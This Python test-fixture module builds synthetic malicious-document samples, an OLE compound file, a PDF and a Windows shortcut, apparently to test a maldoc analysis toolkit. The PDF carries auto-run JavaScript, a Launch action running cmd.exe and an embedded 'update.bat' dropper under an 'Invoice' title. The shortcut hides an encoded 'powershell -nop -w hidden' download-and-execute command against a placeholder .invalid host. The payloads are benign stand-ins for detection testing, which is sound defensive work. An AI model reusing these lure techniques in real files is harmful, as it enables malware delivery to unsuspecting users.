"""Shared builders for Office / PDF / shortcut fixtures (solvers/toolkits/maldoc.py, windows.py).

Carried from the archived Huntress test tests/test_tk_maldoc.py (its saved-day checks did not come
over), for tests/real/test_review_a.py: every input is built here from invented values.

  cfb_write(streams)   a version 3 compound file (OLE) of {path: bytes}
  pdf_bytes()          a classic-xref PDF with JavaScript, Launch and URI actions and an embedded file
  lnk_bytes()          a Windows shortcut with LinkInfo, string data and a tracker block
"""
import base64
import struct
import sys
import zlib
from datetime import datetime, timezone
from pathlib import Path

REPO = Path(__file__).resolve().parent.parent
if str(REPO / "solvers" / "toolkits") not in sys.path:
    sys.path.insert(0, str(REPO / "solvers" / "toolkits"))
import maldoc  # noqa: E402  (OLE_MAGIC)


FREE, END, FATSECT = 0xFFFFFFFF, 0xFFFFFFFE, 0xFFFFFFFD


def cfb_write(streams: dict, clsid: bytes = b"\x00" * 16) -> bytes:
    """A version 3 compound file: {path: bytes}; streams under 4096 bytes go to the mini stream."""
    nodes = [{"name": "Root Entry", "type": 5, "kids": [], "data": b""}]
    index = {"": 0}

    def storage(parts):
        path = "/".join(parts)
        if path not in index:
            parent = storage(parts[:-1])
            nodes.append({"name": parts[-1], "type": 1, "kids": [], "data": b""})
            index[path] = len(nodes) - 1
            nodes[parent]["kids"].append(index[path])
        return index[path]

    for path, data in streams.items():
        parts = path.split("/")
        parent = storage(parts[:-1]) if len(parts) > 1 else 0
        nodes.append({"name": parts[-1], "type": 2, "kids": [], "data": data})
        nodes[parent]["kids"].append(len(nodes) - 1)
    mini, minifat, big = bytearray(), [], []
    for n in nodes:
        if n["type"] != 2:
            continue
        d = n["data"]
        if len(d) < 4096:
            n["start"] = len(mini) // 64 if d else END
            count = (len(d) + 63) // 64
            for i in range(count):
                minifat.append(len(minifat) + 1 if i < count - 1 else END)
            mini += d + b"\x00" * (count * 64 - len(d))
        else:
            big.append(n)
    ndir = (len(nodes) * 128 + 511) // 512
    nminifat = (len(minifat) * 4 + 511) // 512
    nmini = (len(mini) + 511) // 512
    sectors, fat = [], []

    def add(blob):
        start = len(sectors)
        count = (len(blob) + 511) // 512
        for i in range(count):
            sectors.append(blob[i * 512:(i + 1) * 512].ljust(512, b"\x00"))
            fat.append(start + i + 1 if i < count - 1 else END)
        return start if count else END

    dir_start = len(sectors)
    for i in range(ndir):                       # placeholder, written below
        sectors.append(b"")
        fat.append(dir_start + i + 1 if i < ndir - 1 else END)
    minifat_start = add(struct.pack(f"<{len(minifat)}I", *minifat).ljust(nminifat * 512, b"\xff")) if minifat else END
    nodes[0]["start"] = add(bytes(mini)) if mini else END
    nodes[0]["size"] = len(mini)
    for n in big:
        n["start"] = add(n["data"])
    nfat = 1
    while nfat * 128 < len(sectors) + nfat:
        nfat += 1
    fat_start = len(sectors)
    fat += [FATSECT] * nfat
    fat += [FREE] * (nfat * 128 - len(fat))
    for i in range(nfat):
        sectors.append(struct.pack("<128I", *fat[i * 128:(i + 1) * 128]))
    raw = bytearray()
    for i, n in enumerate(nodes):
        name = n["name"].encode("utf-16-le")
        e = bytearray(128)
        e[:len(name)] = name
        struct.pack_into("<H", e, 64, len(name) + 2)
        e[66], e[67] = n["type"], 1
        struct.pack_into("<III", e, 68, FREE, FREE, n["kids"][0] if n["kids"] else FREE)
        if i == 0:
            e[80:96] = clsid
        struct.pack_into("<I", e, 116, n.get("start", 0) if n["type"] != 1 else 0)
        struct.pack_into("<Q", e, 120, n.get("size", len(n["data"])))
        raw += e
    for n in nodes:                             # siblings chained through `right`
        for a, b in zip(n["kids"], n["kids"][1:]):
            struct.pack_into("<I", raw, a * 128 + 72, b)
    raw = bytes(raw).ljust(ndir * 512, b"\x00")
    for i in range(len(nodes), ndir * 4):       # unused entries: no siblings, no child
        raw = raw[:i * 128 + 68] + struct.pack("<III", FREE, FREE, FREE) + raw[i * 128 + 80:]
    for i in range(ndir):
        sectors[dir_start + i] = raw[i * 512:(i + 1) * 512]
    head = bytearray(512)
    head[:8] = maldoc.OLE_MAGIC
    struct.pack_into("<HHHHH", head, 0x18, 0x3E, 3, 0xFFFE, 9, 6)
    struct.pack_into("<III", head, 0x28, 0, nfat, dir_start)
    struct.pack_into("<IIIIII", head, 0x34, 0, 4096, minifat_start, nminifat, END, 0)
    difat = [fat_start + i for i in range(nfat)] + [FREE] * (109 - nfat)
    struct.pack_into("<109I", head, 0x4C, *difat)
    return bytes(head) + b"".join(sectors)


def filetime(dt: datetime) -> int:
    return int((dt - datetime(1601, 1, 1, tzinfo=timezone.utc)).total_seconds() * 10_000_000)


CREATED = datetime(2026, 3, 4, 5, 6, 7, tzinfo=timezone.utc)
SAVED_AT = datetime(2026, 3, 5, 8, 9, 10, tzinfo=timezone.utc)

DROP = b"@echo off\r\nrem synthetic test payload\r\nstart calc.exe\r\n"


JS = "var u = unescape('%68%74%74%70');\napp.launchURL('http://js.example.invalid/x', true);\n"


def pdf_bytes() -> bytes:
    """A classic-xref PDF: one page, an OpenAction with flate JavaScript behind an escaped name, a
    Launch and a URI action, an embedded file, an Info dictionary and an object stream."""
    objs = {}
    objs[1] = b"<< /Type /Catalog /Pages 2 0 R /OpenAction 5 0 R /Names << /EmbeddedFiles << /Names [(update.bat) 8 0 R] >> >> /AA << /WC 10 0 R >> >>"
    objs[2] = b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>"
    objs[3] = b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] /Annots [11 0 R] >>"
    objs[4] = b"<< /Author (p.author) /Creator (Synthetic Writer \\(test\\)) /Producer <FEFF0050006400660054006F006F006C> /CreationDate (D:20260304050607+02'00') /Title (Invoice) >>"
    objs[5] = b"<< /Type /Action /S /JavaScript /J#53 6 0 R >>"
    z = zlib.compress(JS.encode())
    objs[6] = b"<< /Length %d /Filter /FlateDecode >>\nstream\n" % len(z) + z + b"\nendstream"
    drop = zlib.compress(DROP).hex().upper().encode() + b">"
    objs[7] = b"<< /Type /EmbeddedFile /Length %d /Filter [/ASCIIHexDecode /FlateDecode] >>\nstream\n" % len(drop) + drop + b"\nendstream"
    objs[8] = b"<< /Type /Filespec /F (update.bat) /UF (update.bat) /EF << /F 7 0 R >> >>"
    inner = b"<< /Type /Action /S /URI /URI (http://uri.example.invalid/click) >> "
    head = b"12 0 "
    body = head + inner
    objs[9] = b"<< /Type /ObjStm /N 1 /First %d /Length %d >>\nstream\n" % (len(head), len(body)) + body + b"\nendstream"
    objs[10] = b"<< /S /Launch /Win << /F (cmd.exe) /P (/c calc.exe) >> >>"
    objs[11] = b"<< /Type /Annot /Subtype /Link /Rect [0 0 10 10] /A 12 0 R >>"
    out = bytearray(b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n")
    offsets = {}
    for n in sorted(objs):
        offsets[n] = len(out)
        out += b"%d 0 obj\n" % n + objs[n] + b"\nendobj\n"
    xref = len(out)
    out += b"xref\n0 %d\n" % (len(objs) + 1) + b"0000000000 65535 f \n"
    for n in sorted(objs):
        out += b"%010d 00000 n \n" % offsets[n]
    out += b"trailer\n<< /Size %d /Root 1 0 R /Info 4 0 R >>\nstartxref\n%d\n%%%%EOF\n" % (len(objs) + 1, xref)
    return bytes(out)


LNK_ARGS = "/c powershell -nop -w hidden -enc " + base64.b64encode("IEX (iwr http://ps.example.invalid/s)".encode("utf-16-le")).decode()


def lnk_bytes() -> bytes:
    flags = 0x02 | 0x04 | 0x08 | 0x10 | 0x20 | 0x40 | 0x80
    head = struct.pack("<I16sIIQQQIiIHHII", 0x4C, bytes.fromhex("0114020000000000c000000000000046"), flags, 0x20,
                       filetime(CREATED), filetime(SAVED_AT), filetime(SAVED_AT), 289792, 0, 7, 0, 0, 0, 0)
    base = b"C:\\Windows\\System32\\cmd.exe\x00"
    vol = struct.pack("<IIII", 0x11 + 4, 3, 0xDEADBEEF, 0x10) + b"OS\x00\x00\x00"
    vol = struct.pack("<I", len(vol)) + vol[4:]
    li_head = 0x1C
    li = struct.pack("<IIIIIII", 0, li_head, 1, li_head, li_head + len(vol), 0, li_head + len(vol) + len(base)) + vol + base + b"\x00"
    li = struct.pack("<I", len(li)) + li[4:]

    def sd(s):
        return struct.pack("<H", len(s)) + s.encode("utf-16-le")

    strings = sd("Invoice (PDF)") + sd("..\\..\\Windows\\System32\\cmd.exe") + sd("C:\\Windows\\System32") + sd(LNK_ARGS) + sd("C:\\Windows\\System32\\shell32.dll")
    droid = bytes(range(16)) + b"\x10\x11\x12\x13\x14\x15\x16\x17\x98\x19" + bytes.fromhex("0a1b2c3d4e5f")   # a version-1 id (RFC 4122 variant): it carries a node
    tracker = struct.pack("<IIII", 0x60, 0xA0000003, 0x58, 0) + b"desktop-buildr\x00\x00" + droid + droid
    return head + li + strings + tracker + struct.pack("<I", 0) + b"OVERLAY-PAYLOAD-0123456789"
